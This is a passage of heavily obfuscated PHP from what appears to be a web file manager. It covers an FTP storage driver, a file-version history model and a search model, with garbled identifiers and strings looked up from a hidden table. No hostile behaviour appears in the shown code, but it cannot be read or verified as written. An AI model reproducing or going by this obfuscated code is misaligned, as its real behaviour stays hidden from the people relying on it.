$îˆŠ¡àŠ = $this->upload($‡Æ£èíñ, $š×’ÈÓÃ); $this->tempFileRemve($öá®ßŸ); return $îˆŠ¡àŠ; } public function moveFile($àË³üÃó, $Âıß“‹) { if (!$this->_isconn()) { return !1; } $àË³üÃó = $this->iconvSystem($àË³üÃó); $Âıß“‹ = $this->iconvSystem($Âıß“‹); $ÔîŠ­Î¡ = @ftp_rename($this->connect, $àË³üÃó, $Âıß“‹); if (!$ÔîŠ­Î¡) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } return $this->getPathOuter($Âıß“‹); } public function delFile($ğ…¾à‚) { if (!$this->_isconn()) { return !1; } $ğ…¾à‚ = $this->iconvSystem($ğ…¾à‚); $©´ÜŞôû = @ftp_delete($this->connect, $ğ…¾à‚); if (!$©´ÜŞôû) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); } return $©´ÜŞôû; } public function delFolder($øß³‡øß) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ğ­ğæŞ— = $«ªàºÉİ = array(); $this->fileList($øß³‡øß, $ğ­ğæŞ—, $«ªàºÉİ, !0); $this->listItemCache = !0; foreach ($«ªàºÉİ as $ÆÚ·òÄ—) { $Ã‘“ßÛè = $this->iconvSystem($ÆÚ·òÄ—[$_SERVER[€ä¾™²][32]]); $œ£“áÙã = @ftp_delete($this->connect, $Ã‘“ßÛè); if (!$œ£“áÙã) { return !1; } } foreach ($ğ­ğæŞ— as $Ã‘“ßÛè) { $Ã‘“ßÛè = $this->iconvSystem($Ã‘“ßÛè); $œ£“áÙã = @ftp_rmdir($this->connect, $Ã‘“ßÛè); if (!$œ£“áÙã) { return !1; } } $øß³‡øß = $this->iconvSystem($øß³‡øß); return @ftp_rmdir($this->connect, $øß³‡øß); } public function rename($å°Ø…ó¦, $¢Š€“ş®) { $ÜÁ„å»¿ =& $_SERVER[€ä¾™²]; if (!$this->_isconn()) { return !1; } $ÉÕùÛü¨ = $this->fileNameAuto($this->pathFather($å°Ø…ó¦), $¢Š€“ş®); $ÉÕùÛü¨ = $this->iconvSystem($ÉÕùÛü¨); $å°Ø…ó¦ = $this->iconvSystem($å°Ø…ó¦); $Êêëïá = $this->pathFather($å°Ø…ó¦); $ …÷¡Í = rtrim($Êêëïá, $ÜÁ„å»¿[8]) . $ÜÁ„å»¿[8] . $ÉÕùÛü¨; $‰“«€’Æ = @ftp_rename($this->connect, $å°Ø…ó¦, $ …÷¡Í); if (!$‰“«€’Æ) { $this->writeLog(__FUNCTION__ . $ÜÁ„å»¿[1604], !0); return !1; } $ …÷¡Í = $this->iconvApp($ …÷¡Í); return $this->getPathOuter($ …÷¡Í); } private function folderInfo($üŠÄìú, $Û¥İ¹ñı = false) { $£è…„Ìß =& $_SERVER[€ä¾™²]; $±ôøÇïŞ = array($£è…„Ìß[32] => $this->pathThis($üŠÄìú), $£è…„Ìß[87] => $this->getPathOuter($£è…„Ìß[8] . $üŠÄìú), $£è…„Ìß[33] => $£è…„Ìß[78]); if ($Û¥İ¹ñı) { return $±ôøÇïŞ; } $±ôøÇïŞ[$£è…„Ìß[232]] = $±ôøÇïŞ[$£è…„Ìß[88]] = 0; $±ôøÇïŞ[$£è…„Ìß[233]] = $±ôøÇïŞ[$£è…„Ìß[234]] = !0; return $±ôøÇïŞ; } private function fileInfo($Õª¬›ü˜, $ê™÷ˆà = false, $‘ş¦›Œ¦ = array()) { $ÄÃÑ“ğ =& $_SERVER[€ä¾™²]; $õ¼©É€ = array($ÄÃÑ“ğ[32] => $this->pathThis($Õª¬›ü˜), $ÄÃÑ“ğ[87] => $this->getPathOuter($ÄÃÑ“ğ[8] . $Õª¬›ü˜), $ÄÃÑ“ğ[33] => $ÄÃÑ“ğ[231], $ÄÃÑ“ğ[79] => isset($‘ş¦›Œ¦[$ÄÃÑ“ğ[79]]) ? $‘ş¦›Œ¦[$ÄÃÑ“ğ[79]] : 0, $ÄÃÑ“ğ[167] => $this->ext($Õª¬›ü˜)); if ($ê™÷ˆà) { return $õ¼©É€; } $õ¼©É€[$ÄÃÑ“ğ[232]] = $õ¼©É€[$ÄÃÑ“ğ[88]] = 0; $õ¼©É€[$ÄÃÑ“ğ[233]] = $õ¼©É€[$ÄÃÑ“ğ[234]] = !0; $—şé„Ãş = $this->iconvSystem($Õª¬›ü˜); $õ¼©É€[$ÄÃÑ“ğ[88]] = @ftp_mdtm($this->connect, $—şé„Ãş); if (empty($‘ş¦›Œ¦)) { $‘ş¦›Œ¦ = $this->objectMeta($Õª¬›ü˜); if (!$‘ş¦›Œ¦) { return $õ¼©É€; } } $õ¼©É€[$ÄÃÑ“ğ[79]] = $‘ş¦›Œ¦[$ÄÃÑ“ğ[79]]; return $õ¼©É€; } public function size($’•ÑîôÊ) { $µƒĞ¼Á¬ = $this->objectMeta($’•ÑîôÊ); return $µƒĞ¼Á¬ ? $µƒĞ¼Á¬[$_SERVER[€ä¾™²][79]] : 0; } public function info($¾ø™ù­‘) { if ($this->isFile($¾ø™ù­‘)) { return $this->fileInfo($¾ø™ù­‘, 0); } else { if ($this->isFolder($¾ø™ù­‘)) { return $this->folderInfo($¾ø™ù­‘); } } return !1; } private function fileList($ò‘ÚÒÚ¥, &$öÃ”¡Ññ, &$¸‘¼Í×ë, $ÛœØçÄ« = false) { $éœ¡Š¿ =& $_SERVER[€ä¾™²]; $ò‘ÚÒÚ¥ = $this->iconvSystem($ò‘ÚÒÚ¥); if (!$this->isFolder($ò‘ÚÒÚ¥)) { return !1; } $ò‘ÚÒÚ¥ = rtrim($ò‘ÚÒÚ¥, $éœ¡Š¿[8]) . $éœ¡Š¿[8]; check_abort(); $ÂªÌÜ³ = @ftp_rawlist($this->connect, $ò‘ÚÒÚ¥); if (!$ÂªÌÜ³) { $ÂªÌÜ³ = array(); } $«ÛÅ’¥ = array($éœ¡Š¿[10] => 1, $éœ¡Š¿[1414] => 1); foreach ($ÂªÌÜ³ as $›ú®Ê¹Ö) { $¸Õò³¶¨ = $this->_listItem($›ú®Ê¹Ö); if ($¸Õò³¶¨[0] == $éœ¡Š¿[859]) { continue; } $é€î = $¸Õò³¶¨[8]; if (empty($é€î) && $é€î !== $éœ¡Š¿[229] || isset($«ÛÅ’¥[$é€î])) { continue; } $é€î = $this->iconvApp($ò‘ÚÒÚ¥ . ltrim($é€î, $éœ¡Š¿[8])); $ØàìÂÜñ = array($éœ¡Š¿[32] => $é€î, $éœ¡Š¿[33] => $éœ¡Š¿[231], $éœ¡Š¿[79] => $¸Õò³¶¨[4]); if (substr($›ú®Ê¹Ö, 0, 1) == $éœ¡Š¿[1605]) { $ØàìÂÜñ[$éœ¡Š¿[33]] = $éœ¡Š¿[78]; $ØàìÂÜñ[$éœ¡Š¿[79]] = 0; } $ÂíĞï³Ê = $ØàìÂÜñ[$éœ¡Š¿[33]] == $éœ¡Š¿[78] ? !0 : !1; $this->cacheMethodInfoSet($é€î, $ÂíĞï³Ê, $ØàìÂÜñ); if ($ÂíĞï³Ê) { $öÃ”¡Ññ[] = $é€î; if ($ÛœØçÄ«) { $this->fileList($é€î, $öÃ”¡Ññ, $¸‘¼Í×ë, $ÛœØçÄ«); } continue; } $¸‘¼Í×ë[] = $ØàìÂÜñ; } $this->cacheMethodInfoSet($ò‘ÚÒÚ¥, !0); } private function _listItem($‡ìÌ‚ü×) { if (empty($‡ìÌ‚ü×)) { return array(); } $ååÁã¼è = preg_split($_SERVER[€ä¾™²][1606], $‡ìÌ‚ü×); if (count($ååÁã¼è) <= 9) { return $ååÁã¼è; } $ååÁã¼è[8] = trim(substr($‡ìÌ‚ü×, strpos($‡ìÌ‚ü×, $ååÁã¼è[7]) + strlen($ååÁã¼è[7]))); return array_splice($ååÁã¼è, 0, 9); } public function listPath($Ïêä÷ä”, $„öåî÷ = false) { $Ì¼ÛÍ–Ã =& $_SERVER[€ä¾™²]; if (!$this->_isconn()) { return !1; } $½óïƒ¬Î = $êãú½“ = array(); $this->fileList($Ïêä÷ä”, $½óïƒ¬Î, $êãú½“); foreach ($½óïƒ¬Î as $ä¿º¥“’ => $¬„ê„•) { $½óïƒ¬Î[$ä¿º¥“’] = $this->folderInfo($¬„ê„•, $„öåî÷); } foreach ($êãú½“ as $ä¿º¥“’ => $¬„ê„•) { $êãú½“[$ä¿º¥“’] = $this->fileInfo($¬„ê„•[$Ì¼ÛÍ–Ã[32]], $„öåî÷, $¬„ê„•); } return array($Ì¼ÛÍ–Ã[85] => $½óïƒ¬Î, $Ì¼ÛÍ–Ã[86] => $êãú½“); } public function has($¬ø†Å¼ù, $ğ‘æŒàÏ = false, $Öå¯£ßï = true) { $œ ‚Šæ =& $_SERVER[€ä¾™²]; $ú÷áÏ­Ô = $äÑ”‘¯ = array(); $ıˆİÍ®ß = $ğ‘æŒàÏ ? !0 : !1; $this->fileList($¬ø†Å¼ù, $ú÷áÏ­Ô, $äÑ”‘¯, $ıˆİÍ®ß); if ($ğ‘æŒàÏ) { return array($œ ‚Šæ[240] => count($äÑ”‘¯), $œ ‚Šæ[241] => count($ú÷áÏ­Ô)); } if ($Öå¯£ßï) { if (count($äÑ”‘¯)) { return !0; } } else { if (count($ú÷áÏ­Ô)) { return !0; } } return !1; } public function listAll($Ÿ˜ó€—) { $“¢›êÄğ =& $_SERVER[€ä¾™²]; if (!$this->_isconn()) { return !1; } $¦ÈşÌ®˜ = $àâƒ÷Ù¿ = array(); $this->fileList($Ÿ˜ó€—, $¦ÈşÌ®˜, $àâƒ÷Ù¿, !0); $™ßì¡Ú = array_to_keyvalue($àâƒ÷Ù¿, $“¢›êÄğ[32]); foreach ($¦ÈşÌ®˜ as $×íòÉ®‡) { if (is_string($×íòÉ®‡)) { $™ßì¡Ú[$×íòÉ®‡] = array($“¢›êÄğ[79] => 0); } } return $this->listAllFiles($Ÿ˜ó€—, $™ßì¡Ú); } public function getContent($€ÄÊæ€ı) { if (!$this->_isconn()) { return !1; } $€ÄÊæ€ı = $this->iconvSystem($€ÄÊæ€ı); return $this->fileSubstr($€ÄÊæ€ı); } public function setContent($ÙôÒµ¯ˆ, $”Ëƒ•©« = '') { if (!$this->_isconn()) { return !1; } $¿¸–ğĞÎ = $this->pathThis($this->iconvSystem($ÙôÒµ¯ˆ)); $¤÷¬æ¤¿ = $this->tempFile($¿¸–ğĞÎ); file_put_contents($¤÷¬æ¤¿, $”Ëƒ•©«); $–­ÚÒÁİ = $this->upload($ÙôÒµ¯ˆ, $this->iconvApp($¤÷¬æ¤¿)); $this->tempFileRemve($¤÷¬æ¤¿); return $–­ÚÒÁİ; } public function fileSubstr($ŸÇ–ƒ§¸, $‘ñ…ó÷¡ = 0, $²½ĞÛ©Ş = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ŸÇ–ƒ§¸, $‘ñ…ó÷¡, $²½ĞÛ©Ş); } private function ftpRequest($üìÉ†Ú, $Ş¸›Ä¥å = 0, $ùÜ¡Ï¥® = false) { $êàåª• =& $_SERVER[€ä¾™²]; $üìÉ†Ú = $êàåª•[8] . ltrim(str_ltrim($üìÉ†Ú, $this->ftpPath), $êàåª•[8]); $üìÉ†Ú = $this->iconvSystem($üìÉ†Ú); $Ø£û—® = $this->scheme . $this->host . $êàåª•[4] . $this->port; $İ’šú„Š = curl_init(); curl_setopt($İ’šú„Š, CURLOPT_URL, $Ø£û—® . $this->pathEncode($üìÉ†Ú)); curl_setopt($İ’šú„Š, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ùÜ¡Ï¥®) { $Â›Ì­—ï = $Ş¸›Ä¥å + $ùÜ¡Ï¥® - 1; curl_setopt($İ’šú„Š, CURLOPT_RANGE, "{$Ş¸›Ä¥å}\55{$Â›Ì­—ï}"); } curl_setopt($İ’šú„Š, CURLOPT_RETURNTRANSFER, 1); $æÆÒ…—¤ = curl_exec($İ’šú„Š); curl_close($İ’šú„Š); return $æÆÒ…—¤; } public function upload($ğõºİû°, $âÙ»àÖÅ, $¡ñÂ¨ˆ = false, $ „¯§ı = REPEAT_REPLACE) { if (!$âÙ»àÖÅ || !@file_exists($âÙ»àÖÅ)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ğõºİû°))) { return !1; } $ğõºİû° = $this->iconvSystem($ğõºİû°); $âÙ»àÖÅ = $this->iconvSystem($âÙ»àÖÅ); $“ÔÈÅíØ = ftp_nb_put($this->connect, $ğõºİû°, $âÙ»àÖÅ, FTP_BINARY); while ($“ÔÈÅíØ == FTP_MOREDATA) { $“ÔÈÅíØ = ftp_nb_continue($this->connect); } if ($“ÔÈÅíØ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } return $this->getPathOuter($ğõºİû°); } public function download($ãø”±Àú, $ùĞµİ¿Ş = '') { if (!$this->_isconn()) { return !1; } $ ²Ôï›³ = $this->pathFather($ùĞµİ¿Ş); if (!IO::mkdir($ ²Ôï›³)) { return !1; } $ãø”±Àú = $this->iconvSystem($ãø”±Àú); $ùĞµİ¿Ş = $this->iconvSystem($ùĞµİ¿Ş); $¨³Ë×ø™ = ftp_nb_get($this->connect, $ùĞµİ¿Ş, $ãø”±Àú, FTP_BINARY); while ($¨³Ë×ø™ == FTP_MOREDATA) { $¨³Ë×ø™ = ftp_nb_continue($this->connect); } if ($¨³Ë×ø™ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } return $this->iconvApp($ùĞµİ¿Ş); } public function exist($à öØÒŒ) { return $this->isFile($à öØÒŒ) || $this->isFolder($à öØÒŒ); } public function isFile($Ã’æ»ºÜ) { return !$this->isFolder($Ã’æ»ºÜ) && $this->objectMeta($Ã’æ»ºÜ); } public function isFolder($ÙÌüãè†) { return $this->cacheMethod($_SERVER[€ä¾™²][178], $ÙÌüãè†); } protected function objectMeta($×†ë³õù) { return $this->cacheMethod($_SERVER[€ä¾™²][180], $×†ë³õù); } protected function _objectMeta($”±Â‚¹±) { $ùø‹„ûÃ =& $_SERVER[€ä¾™²]; if ($”±Â‚¹± == $ùø‹„ûÃ[12] || $”±Â‚¹± == $ùø‹„ûÃ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $”±Â‚¹± = $this->iconvSystem($”±Â‚¹±); $›ÂØ²šŒ = array($ùø‹„ûÃ[32] => $this->iconvApp($”±Â‚¹±), $ùø‹„ûÃ[33] => $ùø‹„ûÃ[231], $ùø‹„ûÃ[79] => 0); $¸úÜŞÆØ = @ftp_size($this->connect, $”±Â‚¹±); if ($¸úÜŞÆØ != -1) { $›ÂØ²šŒ[$ùø‹„ûÃ[79]] = $¸úÜŞÆØ; } else { $Ì®ÒÌ×Û = @ftp_chdir($this->connect, $”±Â‚¹±); if (!$Ì®ÒÌ×Û) { return !1; } @ftp_chdir($this->connect, $ùø‹„ûÃ[8]); $›ÂØ²šŒ[$ùø‹„ûÃ[33]] = $ùø‹„ûÃ[78]; } return $›ÂØ²šŒ; } protected function _isFolder($—„¸õïØ) { $Ø¼¤¶ôÑ =& $_SERVER[€ä¾™²]; if ($—„¸õïØ == $Ø¼¤¶ôÑ[12] || $—„¸õïØ == $Ø¼¤¶ôÑ[8]) { return !0; } $Ñû¡ÜäË = $this->_objectMeta($—„¸õïØ); return isset($Ñû¡ÜäË[$Ø¼¤¶ôÑ[33]]) && $Ñû¡ÜäË[$Ø¼¤¶ôÑ[33]] == $Ø¼¤¶ôÑ[78] ? !0 : !1; } } goto fÔÕÉæ¢ ·; b¾Ñ¨Ìô½Û: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\x63\x65\x5f\x68\x69\x73\x74\157\162\x79"; public function historyCount($©°áïã³) { $ÃùËˆüë =& $_SERVER[€ä¾™²]; if (!$©°áïã³) { return array(); } if (is_string($©°áïã³) || is_int($©°áïã³)) { $©°áïã³ = array($©°áïã³); } $”†Æ‘Û³ = array($ÃùËˆüë[192], $ÃùËˆüë[2380] => $ÃùËˆüë[592]); $Àòş— Á = array($ÃùËˆüë[192] => array($ÃùËˆüë[7], $©°áïã³)); $Ïü„™šÎ = $this->field($”†Æ‘Û³)->where($Àòş— Á)->group($ÃùËˆüë[192])->select(); return array_to_keyvalue($Ïü„™šÎ, $ÃùËˆüë[192], $ÃùËˆüë[592]); } public function addHistory($î´›ıûŸ, $À¨äÎ± = '') { $Øìñ»ˆ¿ =& $_SERVER[€ä¾™²]; $ çŸ = array($Øìñ»ˆ¿[513] => $î´›ıûŸ[$Øìñ»ˆ¿[192]], $Øìñ»ˆ¿[1913] => isset($î´›ıûŸ[$Øìñ»ˆ¿[550]]) ? $î´›ıûŸ[$Øìñ»ˆ¿[550]] : $î´›ıûŸ[$Øìñ»ˆ¿[548]], $Øìñ»ˆ¿[565] => $î´›ıûŸ[$Øìñ»ˆ¿[564]], $Øìñ»ˆ¿[647] => $î´›ıûŸ[$Øìñ»ˆ¿[79]], $Øìñ»ˆ¿[2381] => $À¨äÎ±); if ($GLOBALS[$Øìñ»ˆ¿[6]][$Øìñ»ˆ¿[92]][$Øìñ»ˆ¿[1351]] >= 1) { $this->historyAutoClear($ çŸ[$Øìñ»ˆ¿[192]]); $this->add($ çŸ); } Hook::trigger($Øìñ»ˆ¿[2382], $ çŸ); Model($Øìñ»ˆ¿[2383])->eventFileEdit($î´›ıûŸ[$Øìñ»ˆ¿[192]]); } private function historyAutoClear($­Øòæûƒ) { $ó³Ïü¶Í =& $_SERVER[€ä¾™²]; $Ê£ĞïÏé = Model($ó³Ïü¶Í[873])->get($ó³Ïü¶Í[1373]); $Ÿ¹èé· = intval($GLOBALS[$ó³Ïü¶Í[6]][$ó³Ïü¶Í[92]][$ó³Ïü¶Í[1351]]); $àïµÑº¸ = $Ê£ĞïÏé == $ó³Ïü¶Í[1374] ? min(5, $Ÿ¹èé·) : $Ÿ¹èé·; $àïµÑº¸ = $àïµÑº¸ <= 0 ? 0 : $àïµÑº¸ - 1; if ($àïµÑº¸ >= 499) { return; } $Â†â¸‹ô = array($ó³Ïü¶Í[513] => $­Øòæûƒ); $â µ¡Õğ = $this->field($ó³Ïü¶Í[2384])->where($Â†â¸‹ô)->order($ó³Ïü¶Í[2376])->select(); if (!$â µ¡Õğ || $àïµÑº¸ >= count($â µ¡Õğ)) { return; } $ŸÚšè“… = array_to_keyvalue($â µ¡Õğ, $ó³Ïü¶Í[12], $ó³Ïü¶Í[486]); $ŸÚšè“… = array_slice($ŸÚšè“…, $àïµÑº¸); $îûüŠ× = array_to_keyvalue($â µ¡Õğ, $ó³Ïü¶Í[12], $ó³Ïü¶Í[564]); $îûüŠ× = array_slice($îûüŠ×, $àïµÑº¸); if (!$ŸÚšè“… || !$îûüŠ×) { return; } $Â†â¸‹ô = array($ó³Ïü¶Í[515] => array($ó³Ïü¶Í[7], $ŸÚšè“…)); $this->where($Â†â¸‹ô)->delete(); Model($ó³Ïü¶Í[567])->remove($îûüŠ×); } public function listData($•¹ÙÉõˆ) { $”¨˜àŞß =& $_SERVER[€ä¾™²]; $ÛÀ”ÕÆ£ = array($”¨˜àŞß[513] => $•¹ÙÉõˆ); $ãŠÎ—¾Î = $”¨˜àŞß[2385]; $Ó„ÖİˆÈ = $this->field($ãŠÎ—¾Î)->where($ÛÀ”ÕÆ£)->order($”¨˜àŞß[2376])->selectPage(); $this->_listAppendUser($Ó„ÖİˆÈ[$”¨˜àŞß[446]]); $ô¹Ë°¼ = Model($”¨˜àŞß[873])->get($”¨˜àŞß[1373]); $Ìšëã—ğ = 5; if ($ô¹Ë°¼ == $”¨˜àŞß[1374]) { $Ó„ÖİˆÈ[$”¨˜àŞß[446]] = array_slice($Ó„ÖİˆÈ[$”¨˜àŞß[446]], 0, $Ìšëã—ğ); $Ó„ÖİˆÈ[$”¨˜àŞß[443]] = array($”¨˜àŞß[2386] => 1, $”¨˜àŞß[2387] => 20, $”¨˜àŞß[2388] => 1, $”¨˜àŞß[2389] => count($Ó„ÖİˆÈ[$”¨˜àŞß[446]])); } return $Ó„ÖİˆÈ; } protected function _listAppendUser(&$÷Ë±ê¹á) { $¾Çº²…Š =& $_SERVER[€ä¾™²]; $Œ¬Å£Ğ = array_to_keyvalue($÷Ë±ê¹á, $¾Çº²…Š[12], $¾Çº²…Š[1539]); $ˆ„­Á¼ = Model($¾Çº²…Š[624])->userListInfo($Œ¬Å£Ğ); foreach ($÷Ë±ê¹á as &$÷¬ÊŞº´) { $òÈµ»Í = $÷¬ÊŞº´[$¾Çº²…Š[1539]]; $÷¬ÊŞº´[$¾Çº²…Š[548]] = $ˆ„­Á¼[$òÈµ»Í] ? $ˆ„­Á¼[$òÈµ»Í] : !1; } unset($÷¬ÊŞº´); } public function fileInfo($’ñõ‰—, $“ùî“€” = false) { $öÔøÎ„ç =& $_SERVER[€ä¾™²]; $ú‰éª†ù = $this->tablePrefix; $á¿İ“«Ï = "{$ú‰éª†ù}\x69\157\137\146\x69\x6c\x65\x20\x66\151\x6c\145\163\x20\x6f\156\40\x66\x69\154\145\x73\x2e\146\151\154\x65\x49\104\x20\75\40\150\151\163\164\157\x72\171\56\x66\x69\154\x65\111\x44"; $÷äöëŠö = $this->alias($öÔøÎ„ç[2390])->where(array($öÔøÎ„ç[515] => $’ñõ‰—))->join($á¿İ“«Ï, $öÔøÎ„ç[2391])->find(); if ($÷äöëŠö && $“ùî“€”) { $•–¬¬£ß = array($öÔøÎ„ç[192] => $÷äöëŠö[$öÔøÎ„ç[192]], $öÔøÎ„ç[486] => array($öÔøÎ„ç[1126], $’ñõ‰—)); $÷äöëŠö[$öÔøÎ„ç[1809]] = $this->where($•–¬¬£ß)->count(); } return $÷äöëŠö; } public function removeItem($–Úµ¢ĞÃ) { $º»Í¥ğÊ =& $_SERVER[€ä¾™²]; $¡³¿ù¹ = array($º»Í¥ğÊ[515] => $–Úµ¢ĞÃ); $ØŠø¯÷„ = $this->where($¡³¿ù¹)->find(); if ($ØŠø¯÷„) { $ú¹íÑ ” = $this->where($¡³¿ù¹)->delete(); Model($º»Í¥ğÊ[567])->remove($ØŠø¯÷„[$º»Í¥ğÊ[564]]); return $ú¹íÑ ”; } return !1; } public function removeBySource($ûÂØË¥») { $ÖƒöºÇ =& $_SERVER[€ä¾™²]; if (!$ûÂØË¥») { return !1; } if (!is_array($ûÂØË¥»)) { $ûÂØË¥» = array($ûÂØË¥»); } $ÉŠÀà¦ñ = array($ÖƒöºÇ[513] => array($ÖƒöºÇ[7], $ûÂØË¥»)); $…ªõòê = $this->field($ÖƒöºÇ[565])->where($ÉŠÀà¦ñ)->select(); if ($…ªõòê) { $this->where($ÉŠÀà¦ñ)->delete(); $óÆÁ„Çç = array_to_keyvalue($…ªõòê, $ÖƒöºÇ[12], $ÖƒöºÇ[564]); Model($ÖƒöºÇ[567])->remove($óÆÁ„Çç); } return !0; } public function setDetail($¤ÊÏ›Ëş, $‚üŞĞ‹ˆ) { $åúÓååœ =& $_SERVER[€ä¾™²]; return $this->where(array($åúÓååœ[515] => $¤ÊÏ›Ëş))->save(array($åúÓååœ[2381] => $‚üŞĞ‹ˆ)); } public function rollbackToItem($¤Ù¢š„è, $Ú¸ÕÉÁÛ) { $ùÊä³»’ =& $_SERVER[€ä¾™²]; $¶è§À“— = Model($ùÊä³»’[932])->sourceInfo($¤Ù¢š„è); $this->addHistory($¶è§À“—, LNG($ùÊä³»’[2392])); $«°™èñ† = $this->find($Ú¸ÕÉÁÛ); $Àù†ØÙõ = array($ùÊä³»’[564] => $«°™èñ†[$ùÊä³»’[564]], $ùÊä³»’[79] => $«°™èñ†[$ùÊä³»’[79]], $ùÊä³»’[88] => time(), $ùÊä³»’[550] => USER_ID); Model($ùÊä³»’[932])->where(array($ùÊä³»’[192] => $¤Ù¢š„è))->save($Àù†ØÙõ); return $this->where(array($ùÊä³»’[515] => $Ú¸ÕÉÁÛ))->delete(); } public function clearSame($¿İ®€ö‡) { $êÖ©£Šô =& $_SERVER[€ä¾™²]; $«Ëñ»²¹ = $this->listData($¿İ®€ö‡); $ğšÃã¾ƒ = array_to_keyvalue_group($«Ëñ»²¹, $êÖ©£Šô[564]); $ø¬ŞÃÓé = array(); $ê…Ïğ½¶ = array(); foreach ($ğšÃã¾ƒ as $«ÄÔ¢ğË) { if (!$«ÄÔ¢ğË || count($«ÄÔ¢ğË) <= 1) { continue; } foreach ($«ÄÔ¢ğË as $ºğÌ¢) { $ø¬ŞÃÓé[] = $ºğÌ¢[$êÖ©£Šô[564]]; $ê…Ïğ½¶[] = $ºğÌ¢[$êÖ©£Šô[486]]; } } if (!$ê…Ïğ½¶) { return; } $this->where(array($êÖ©£Šô[486] => array($êÖ©£Šô[7], $ê…Ïğ½¶)))->delete(); Model($êÖ©£Šô[567])->remove($ø¬ŞÃÓé); } public function userSpace() { $’î½ºğ =& $_SERVER[€ä¾™²]; $Ş·ûâİÌ = $this->tablePrefix; $êúèÈƒ¢ = array($’î½ºğ[1913] => USER_ID); $É—èóÆ = "{$Ş·ûâİÌ}\151\x6f\137\x66\x69\154\x65\x20\146\x69\x6c\145\x73\x20\157\156\40\146\151\x6c\x65\163\x2e\x66\151\154\145\111\x44\x20\x3d\40\x68\x69\x73\x74\157\162\171\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($’î½ºğ[2390])->where($êúèÈƒ¢)->join($É—èóÆ, $’î½ºğ[2391])->sum($’î½ºğ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($–˜äâ¿†) { $¡±˜ëç‚ =& $_SERVER[€ä¾™²]; $°íƒå£Ä = KodIO::fileTypeList(); $‘ÂÓïò = $°íƒå£Ä[$–˜äâ¿†]; if (!$‘ÂÓïò) { return array(); } $¦ğÃ•˜İ = $‘ÂÓïò[$¡±˜ëç‚[167]]; $Õ¸™¦À‰ = $¡±˜ëç‚[7]; if (!$‘ÂÓïò[$¡±˜ëç‚[167]]) { $µ‹×ÂÕì = array_to_keyvalue($°íƒå£Ä, $¡±˜ëç‚[12], $¡±˜ëç‚[167]); $¦ğÃ•˜İ = implode($¡±˜ëç‚[50], $µ‹×ÂÕì); $Õ¸™¦À‰ = $¡±˜ëç‚[2393]; } $ŒóŞ¾º“ = explode($¡±˜ëç‚[50], trim($¦ğÃ•˜İ, $¡±˜ëç‚[50])); return array($Õ¸™¦À‰, $ŒóŞ¾º“); } public function listPathType($™‘§òº§) { $¼ªì–‰Ğ =& $_SERVER[€ä¾™²]; $ñ¸û±§à = $this->fileTypeWhere($™‘§òº§); if (!$ñ¸û±§à) { return array(); } $ñË»ÅÜà = USER_ID; $•şü×¡ƒ = Model($¼ªì–‰Ğ[624])->getInfo($ñË»ÅÜà); $û«‹š½É = array($¼ªì–‰Ğ[677] => SourceModel::TYPE_USER, $¼ªì–‰Ğ[611] => array($¼ªì–‰Ğ[642], $¼ªì–‰Ğ[620] . $•şü×¡ƒ[$¼ªì–‰Ğ[90]][$¼ªì–‰Ğ[192]] . $¼ªì–‰Ğ[643]), $¼ªì–‰Ğ[678] => $ñË»ÅÜà, $¼ªì–‰Ğ[675] => 0, $¼ªì–‰Ğ[676] => $ñ¸û±§à); return $this->listSource($û«‹š½É); } public function listSearch($°…Øî¢, $«‰Ñ¤€· = 300) { $ê­ÈÃÙ =& $_SERVER[€ä¾™²]; if (isset($°…Øî¢[$ê­ÈÃÙ[2224]]) && $°…Øî¢[$ê­ÈÃÙ[2224]]) { $°…Øî¢[$ê­ÈÃÙ[2224]] = str_replace($ê­ÈÃÙ[474], $ê­ÈÃÙ[2394], trim($°…Øî¢[$ê­ÈÃÙ[2224]])); } $µş£„£¶ = $this->_parseSearchWhere($°…Øî¢); if (!isset($µş£„£¶[$ê­ÈÃÙ[527]])) { $µş£„£¶[$ê­ÈÃÙ[527]] = 0; } $‰çÚşÉ¯ = $ê­ÈÃÙ[2395]; $å”è˜à´ = $µş£„£¶; $×Ğ¢°­Á = $‰çÚşÉ¯; $this->_listSearchBindPinyin($°…Øî¢, $µş£„£¶, $‰çÚşÉ¯); $this->alias($ê­ÈÃÙ[540])->_makeOrder(); $µş£„£¶ = $this->parseWhereLike($µş£„£¶); $ÙšµËø = $this->distinct(!0)->field($‰çÚşÉ¯)->where($µş£„£¶)->selectPage($«‰Ñ¤€·); if ($GLOBALS[$ê­ÈÃÙ[6]][$ê­ÈÃÙ[468]][$ê­ÈÃÙ[469]] && Input::check($°…Øî¢[$ê­ÈÃÙ[2224]], $ê­ÈÃÙ[684]) && $ÙšµËø[$ê­ÈÃÙ[443]][$ê­ÈÃÙ[429]] == 1 && $ÙšµËø[$ê­ÈÃÙ[443]][$ê­ÈÃÙ[444]] == 0) { $ÙšµËø = $this->distinct(!0)->field($‰çÚşÉ¯)->where($å”è˜à´)->limit(1000)->select(); $ÙšµËø = array_page_split($ÙšµËø, !1, $«‰Ñ¤€·); } $this->_listSearchFileContent($ÙšµËø, $°…Øî¢, $×Ğ¢°­Á, $å”è˜à´); $this->_listSearchDesc($ÙšµËø, $°…Øî¢, $×Ğ¢°­Á); $this->_listSearchTag($ÙšµËø, $°…Øî¢, $×Ğ¢°­Á); $this->_listSearchGroupTag($ÙšµËø, $°…Øî¢, $×Ğ¢°­Á); $this->_listDataApply($ÙšµËø[$ê­ÈÃÙ[446]]); $this->_listMake($ÙšµËø); return $ÙšµËø; } private function _listSearchFileContent(&$û¤‚èà­, $¤Ğª, $°ûŠç°ù, $½Û†œÇà) { $ ó›»ÌÅ =& $_SERVER[€ä¾™²]; if (!$¤Ğª[$ ó›»ÌÅ[2224]] || $û¤‚èà­[$ ó›»ÌÅ[443]][$ ó›»ÌÅ[429]] > 1) { return; } if (!isset($½Û†œÇà[$ 